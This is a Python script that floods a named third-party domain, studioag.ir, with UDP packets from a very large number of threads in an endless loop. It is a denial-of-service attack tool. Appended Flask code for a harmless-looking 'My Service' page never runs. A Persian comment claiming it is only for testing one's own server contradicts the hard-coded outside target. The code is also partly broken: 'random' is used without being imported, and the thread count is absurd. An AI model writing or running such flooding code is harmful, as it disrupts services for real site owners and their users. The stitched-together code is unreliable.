import time
import socket
import sys
import _thread
from flask import Flask, render_template_string
import requests
import argparse
import signal

stopped = False
def handle_sigint(signum, frame):
    global stopped
    stopped = True
signal.signal(signal.SIGINT, handle_sigint)

def random_ipv4():
    # تولید یک آی‌پی تصادفی (از رنج‌های عمومی استفاده نکن — فقط برای تست روی سرور خودت)
    return "{}.{}.{}.{}".format(random.randint(1, 254),
                                random.randint(0, 255),
                                random.randint(0, 255),
                                random.randint(1, 254))

site = ("studioag.ir")
thread_count = ("99999999999999999999999999999999999999999999999999999999999999999999999999")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(0)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass

app = Flask(__name__)

TEMPLATE = """
<!doctype html>
<title>My Service</title>
<h1>خوش آمدید</h1>
<p>وضعیت سرویس: {{ status }}</p>
"""

@app.route("/")
def index():
    return render_template_string(TEMPLATE, status="running")

@app.route("/health")
def health():
    return {"status": "ok"}, 200

if __name__ == "__main__":
    # از پورت 8080 استفاده می‌کنیم تا نیاز به دسترسی ریشه نباشد
    app.run(host="0.0.0.0", port=8080)
